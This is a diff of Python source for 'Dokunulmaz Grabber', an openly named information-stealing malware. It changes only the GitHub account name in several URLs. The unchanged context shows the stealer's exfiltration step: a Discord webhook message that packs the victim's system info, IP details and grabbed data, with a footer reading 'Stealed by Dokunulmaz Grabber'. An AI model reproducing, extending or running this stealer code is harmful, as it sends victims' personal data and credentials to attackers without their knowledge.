@@ -1,6 +1,6 @@
 # Python 3.10+
 # Author: dokunulmaz
-# Github: https://github.com/dokunulmaz/dokunulmaz-grabber
+# Github: https://github.com/dokunulmaz180/dokunulmaz-grabber
 # Encoding: UTF-8
 
 import base64
@@ -1678,7 +1678,7 @@ class DokunulmazGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/dokunulamaz/dokunulmaz-grabber/main/.github/workflows/image.png"
+                image_url = "https://raw.githubusercontent.com/dokunulmaz180/dokunulmaz-grabber/main/.github/workflows/image.png"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
@@ -1686,10 +1686,10 @@ class DokunulmazGrabber:
                         {
                             "title": "Dokunulmaz grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/dokunulamaz/dokunulmaz-grabber",
+                            "url": "https://github.com/dokunulmaz180/dokunulmaz-grabber",
                             "color": 34309,
                             "footer": {
-                                "text": "Stealed by Dokunulmaz Grabber | https://github.com/dokunulamaz/dokunulmaz-grabber"
+                                "text": "Stealed by Dokunulmaz Grabber | https://github.com/dokunulmaz180/dokunulmaz-grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
